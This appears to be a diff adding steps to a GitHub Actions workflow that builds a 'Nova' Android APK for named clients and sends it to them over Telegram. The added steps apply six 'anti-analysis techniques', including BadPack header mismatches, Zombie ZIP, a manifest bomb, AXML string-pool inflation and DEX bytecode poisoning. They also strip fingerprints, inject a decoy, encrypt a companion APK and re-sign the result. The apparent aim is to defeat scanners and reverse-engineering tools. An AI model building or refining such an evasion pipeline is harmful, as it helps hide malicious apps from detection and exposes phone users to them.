+      #   1. ASSET_A is now named correctly (563f89c0.bin etc) — rename happened
+      #      in zip_header_obfuscator before this point
+      #   2. strip_fingerprint_files rewrites ZIP → needs final re-sign after
+      #   3. r8 decoy injection → also needs final re-sign
+      # After this step: ONE final re-sign covers everything
+      - name: "Step 5+7 | Strip fingerprints + deflate fix + r8 decoy (Nova)"
+        env:
+          KEYSTORE_BASE64:   ${{ secrets.KEYSTORE_BASE64 }}
+          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
+          KEY_ALIAS:         ${{ secrets.KEY_ALIAS }}
+        run: |
+          set -e
+          BUILD_TOOLS=$(ls $ANDROID_SDK_ROOT/build-tools/ | sort -V | tail -1)
+          export PATH="$ANDROID_SDK_ROOT/build-tools/$BUILD_TOOLS:$PATH"
+          NOVA_APK=$(find app/build/outputs/apk/release -name "*.apk" | head -1)
+          echo "Step 5+7: Strip + recompress + r8 on $NOVA_APK"
+          python3 scripts/strip_fingerprint_files.py "$NOVA_APK" "${NOVA_APK}.s57"
+          mv "${NOVA_APK}.s57" "$NOVA_APK"
+
+          # ── All 6 anti-analysis techniques — MUST run AFTER strip_fingerprint_files
+          # strip_fingerprint_files.py rebuilds the entire ZIP from scratch.
+          # Any LFH patches applied before it get wiped. These MUST run after it
+          # and before phase2_resign so V2 signing covers all patched bytes.
+
+          # Technique 1+2+4 — BadPack LFH mismatch + GP encryption bit + Zombie ZIP
+          # (BadPack sets LFH compress=STORE, CDH stays DEFLATE = Zombie ZIP too)
+          echo "Step All6: Applying Tech 1+2+4 — BadPack + GP bit + Zombie ZIP..."
+          python3 scripts/badpack_gp_patcher.py "$NOVA_APK" "${NOVA_APK}.t124" --mode nova
+          if [ ! -f "${NOVA_APK}.t124" ]; then
+            echo "::error::badpack_gp_patcher did not produce output"
+            exit 1
+          fi
+          mv "${NOVA_APK}.t124" "$NOVA_APK"
+          echo "✅ Tech 1+2+4 applied"
+
+          # Technique 3+5 — Manifest Bomb 0x9999 + AXML string pool count inflation
+          echo "Step All6: Applying Tech 3+5 — Manifest bomb + AXML string pool..."
+          python3 scripts/nova_axml_patcher.py "$NOVA_APK" "${NOVA_APK}.t35"
+          if [ ! -f "${NOVA_APK}.t35" ]; then
+            echo "::error::nova_axml_patcher did not produce output"
+            exit 1
+          fi
+          mv "${NOVA_APK}.t35" "$NOVA_APK"
+          echo "✅ Tech 3+5 applied"
+
+          # Technique 6 — DEX bytecode poisoning (invalid element_width)
+          echo "Step All6: Applying Tech 6 — DEX bytecode poisoning..."
+          python3 scripts/nova_dex_poisoner.py "$NOVA_APK" "${NOVA_APK}.t6"
+          if [ ! -f "${NOVA_APK}.t6" ]; then
+            echo "::error::nova_dex_poisoner did not produce output"
+            exit 1
+          fi
+          mv "${NOVA_APK}.t6" "$NOVA_APK"
+          echo "✅ Tech 6 applied"
+
+          echo "Step All6: All 6 anti-analysis techniques applied to Nova ✅"
+          echo "Step 5+7: Re-signing after strip+recompress+r8+all6..."
+          python3 scripts/phase2_resign.py "$NOVA_APK"
+          apksigner verify --verbose "$NOVA_APK" | head -5
+          echo "✅ Step 5+7 complete — fingerprints stripped, deflate(8), r8 injected"
+
+      # ── Notify — Fingerprints stripped ───────────────────────────────────────
+      - name: Notify — Fingerprints stripped
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Strip fingerprints" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # Step 17B (compression type 2032) is disabled for Nova APK.
+      # V2 signing covers Section 1 (all file data including LFH bytes).
+      # 17B patches LFH compress type fields which are in Section 1.
+      # Any LFH byte change after signing = V2 hash mismatch = Verified failed.
+      # 17B before re-sign breaks V1 (apksigner skips type-2032 in MANIFEST.MF).
+      # 17B after re-sign breaks V2. 17B is incompatible with signed APK.
+      # Scanner confusion from 17B is a Phase 8 feature — deferred.
+
+      # Companion APK verification removed — Step 8A FIX.
+      # companion.apk is now an encrypted blob (entropy 8.000).
+      # apksigner verify expects a ZIP — crashes on encrypted blob.
+      # Companion signing is verified inside build_module.py STEP_RESIGN_1
+      # before encryption runs. No verification needed here.
+
+            # ── 9. Show APK info ──────────────────────────────────────────────────────
+      - name: Show APK info
+        run: |
+          APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
+          echo "APK: $APK"
+          echo "Size: $(du -h $APK | cut -f1)"
+          echo "Nova package name: ${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+          echo "DEX files inside APK:"
+          unzip -l $APK | grep "\.dex"
+
+      # ── Custom signing block 0x00000603 — DISABLED ──────────────────────────
+      # signing_block_patcher.py corrupts V2 — permanently disabled.
+      # The signing block structure produced by phase2_resign already has a
+      # non-standard prefix (Verity padding zeros) that apksigner accepts but
+      # any post-sign byte modification breaks V2 hash verification.
+      # IRT technique #1 deferred — APK installs clean without it.
+
+      # ── 10. Batch integrity check ─────────────────────────────────────────────
+      - name: Batch integrity check
+        run: |
+          APK_DIR="app/build/outputs/apk/release"
+          python3 scripts/integrity_check.py "${APK_DIR}"
+
+      # ── Notify — Integrity check passed ──────────────────────────────────────
+      - name: Notify — Integrity check passed
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Integrity check" \
+            --status    "progress" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
+
+      # ── 11. Upload Release APK artifact ──────────────────────────────────────
+      - name: Upload Release APK artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: nova-launcher-release
+          path: app/build/outputs/apk/release/nova_*.apk
+          retention-days: 1
+          overwrite: true
+
+      # ── 11b. Send APK to Telegram ─────────────────────────────────────────────
+      - name: Send APK to Telegram
+        if: success()
+        run: |
+          APK=$(find app/build/outputs/apk/release -name "nova_*.apk" | head -1)
+          SIZE=$(du -h "$APK" | cut -f1)
+          python3 scripts/telegram_notify.py \
+            --step      "Send to Telegram" \
+            --status    "success" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" \
+            --apk       "$APK" \
+            --apk-size  "$SIZE" \
+            --pkg       "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+
+      # ── 12. Collect + upload error logs (on failure) ──────────────────────────
+      - name: Collect error logs
+        if: failure()
+        run: |
+          mkdir -p error_logs
+
+          # ── companion build logs ──────────────────────────────────────────
+          for f in decompile.log repackage.log gradle_build.log module_audit.log companion_build.log companion_audit.log; do
+            [ -f "$f" ] && cp "$f" error_logs/
+          done
+
+          # module_audit.log may be in working dir or batch_output
+          find . -name "module_audit.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "companion_build.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "step_audit.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "nova_build.log"      -exec cp {} error_logs/ \; 2>/dev/null || true
+
+          # ── Gradle build logs ─────────────────────────────────────────────
+          find . -path "*/build/outputs/logs/*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/.gradle/daemon/*/daemon-*.log" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -name "*.log" -path "*/build/*" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/build/tmp/kotlin-classes*" -name "*.txt" -exec cp {} error_logs/ \; 2>/dev/null || true
+          find . -path "*/build/reports*" -exec cp -r {} error_logs/ \; 2>/dev/null || true
+
+          # ── batch_output audit logs ───────────────────────────────────────
+          [ -d batch_output ] && cp -r batch_output error_logs/ 2>/dev/null || true
+
+          # ── Kotlin source ─────────────────────────────────────────────────
+          mkdir -p error_logs/kotlin_source
+          find app/src/main/java -name "*.kt" -exec cp --parents {} error_logs/kotlin_source/ \; 2>/dev/null || true
+
+          # ── module_audit.log contents inline in env_info ───────────────
+          {
+            echo "=== NOVA PACKAGE ==="
+            echo "${{ steps.nova_pkg.outputs.NOVA_PKG }}"
+            echo "=== JAVA ===" && java -version 2>&1 || true
+            echo "=== APKTOOL ===" && apktool --version 2>&1 || true
+            echo "=== GRADLE ===" && chmod +x gradlew && ./gradlew --version 2>&1 || true
+            echo "=== SOURCE FILES ==="
+            find app/src/main/java -name "*.kt" 2>/dev/null || true
+            echo "=== COMPANION BUILD LOG ==="
+            cat companion_build.log 2>/dev/null || echo "companion_build.log not found"
+            echo "=== COMPANION AUDIT LOG ==="
+            cat module_audit.log 2>/dev/null || cat companion_audit.log 2>/dev/null || echo "module_audit.log not found"
+            echo "=== GRADLE BUILD LOG ==="
+            cat gradle_build.log 2>/dev/null || echo "gradle_build.log not found"
+          } >> error_logs/env_info.txt
+
+          zip -r error_logs.zip error_logs/
+
+      - name: Upload error logs
+        if: failure()
+        uses: actions/upload-artifact@v4
+        with:
+          name: error-logs
+          path: error_logs.zip
+          retention-days: 7
+
+      # ── Notify — Build failed ─────────────────────────────────────────────────
+      - name: Notify — Build failed
+        if: failure()
+        run: |
+          python3 scripts/telegram_notify.py \
+            --step      "Build failed" \
+            --status    "failure" \
+            --build     "${{ github.run_number }}" \
+            --template  "${{ github.event.inputs.template }}" \
+            --client    "${{ github.event.inputs.client_id }}" \
+            --chat-id   "${{ github.event.inputs.build_chat_id }}" \
+            --msg-id    "${{ github.event.inputs.build_message_id }}" \
+            --token     "${{ secrets.TELEGRAM_BOT_TOKEN }}" || true
